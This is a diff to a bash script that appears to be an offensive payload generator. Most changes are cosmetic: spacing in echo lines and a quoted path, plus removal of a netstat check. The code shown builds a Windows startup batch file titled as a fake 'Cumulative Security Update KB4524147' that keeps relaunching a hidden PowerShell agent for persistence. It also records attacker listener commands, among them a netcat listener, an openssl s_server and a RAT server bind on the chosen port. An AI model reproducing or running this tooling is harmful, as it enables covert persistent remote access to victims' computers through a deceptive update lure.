@@ -10536,13 +10536,13 @@ sleep 2
 dtr=$(date|awk {'print $2,$3,$4,$5'})
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "ID         : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LPORT      : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST      : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE       : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "AGENT RPATH: $rpath\\$Drop.py" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER    : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER    : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ID          : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT       : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST       : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE        : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "AGENT RPATH : $rpath\\$Drop.py" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER     : cd bin/SillyRAT && service apache2 start" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER     : python3 server.py bind --address 0.0.0.0 --port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
@@ -12813,10 +12813,8 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
    fi
@@ -12931,13 +12929,13 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "ID         : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LPORT      : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST      : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE       : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "AGENT RPATH: $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER    : cd output" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER    : sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ID          : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT       : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST       : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE        : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "AGENT RPATH : $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER     : cd output" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER     : sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
@@ -13066,10 +13064,8 @@ else
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo netstat -ano^|findstr /C:\"$lhost:$lport\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo if %%errorlevel%% EQU 0 (exit) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo GOTO STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    fi
@@ -13167,12 +13163,12 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence" ]; then
    ## Write how to delete persistence to output folder ..
-   echo "ID         : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
-   echo "LPORT      : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "LHOST      : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "DATE       : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "AGENT RPATH: $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
-   echo "HANDLER    : sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "ID          : $random_name" > $IPATH/output/persistence_ID_$random_name.handler
+   echo "LPORT       : $lport" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "LHOST       : $lhost" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "DATE        : $dtr" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "AGENT RPATH : $rpath\\$NaM.ps1" >> $IPATH/output/persistence_ID_$random_name.handler
+   echo "HANDLER     : sudo nc -lvvp $lport" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "DELETE PERSISTENCE" >> $IPATH/output/persistence_ID_$random_name.handler
    echo "------------------" >> $IPATH/output/persistence_ID_$random_name.handler
